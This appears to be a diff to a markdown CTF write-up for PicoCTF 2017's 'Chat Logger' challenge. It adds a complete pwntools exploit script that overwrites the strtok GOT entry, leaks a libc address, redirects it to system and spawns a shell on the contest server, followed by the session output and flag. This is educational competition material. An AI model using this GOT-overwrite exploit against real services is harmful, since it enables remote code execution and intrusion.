@@ -55,10 +55,54 @@ strtok@.got.plt 601EC0
 `strtok@.got.plt`  address will become the need address of first message buffer. Please note that we need to subtract 2 from it, because the program puts  `*` on first two bytes and it would break our pointer (we can do this, because preceding pointer is useless - it's for  `perror`  function).
 
 After overwriting the address we just need to type  `/bin/sh`  and we get the shell.
+**Final Exploit**
+```python
+#!/usr/bin/env python2
+from pwn import *
+r = remote("shell2017.picoctf.com",36069)
+r.recv()
+r.send("find 2 You're not that funny.\n")
+r.recv()
+r.send("add 1337 %s\n"%("A"*21))
+r.recv()
+r.send("find 2 A\n")
+r.recv()
+r.send("add 1337 EOT%s\n"%("-"*100))
+r.recv()
+r.send("find 2 A\n")
+r.recv()
+r.send("edit %s\n"%("A"*22))
+r.recv()
+r.send("find 2 A\n")
+r.recv()
+r.send("edit %s\n"%("A"*46+"\xbe\x1e\x60"))
+r.recv()
+r.send("chat 2\n")
+res = r.recvuntil("EOT---")
+r.recv()
+strtok_libc = int(res.splitlines()[-2][-6:][::-1].encode('hex'),16)
+libc_base = strtok_libc-0x84a60
+system_libc = libc_base+0x41490
+r.send("edit %s\n"%(hex(system_libc)[2:].decode('hex')[::-1]))
+r.recv()
+r.send("/bin/sh\n")
+r.interactive()
+```
+```text
+$ python chat.py 
+[+] Opening connection to shell2017.picoctf.com on port 36069: Done
+[*] Switching to interactive mode
 
-[Final exploit](https://github.com/BOAKGP/CTF-Writeups/blob/master/PicoCTF%202017/Level%203/Binary%20Exploitation/Chat%20Logger/exploit.py)
-
-The flag is  `bd4ce9661932e1a5a0fe2d51b61d0ecd`.
+> $ ls
+chat-logger
+flag.txt
+room.0.log
+room.1.log
+xinetd_wrapper.sh
+$ cat flag.txt
+164579d8d535184967061cc94ec029c5
+```
+The flag is  `164579d8d535184967061cc94ec029c5`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTU3Mjc2NjQ0OCwtMTE4OTEwNDIzNl19
+eyJoaXN0b3J5IjpbLTczNjQ5MTcwNCwtMTE4OTEwNDIzNl19
 -->
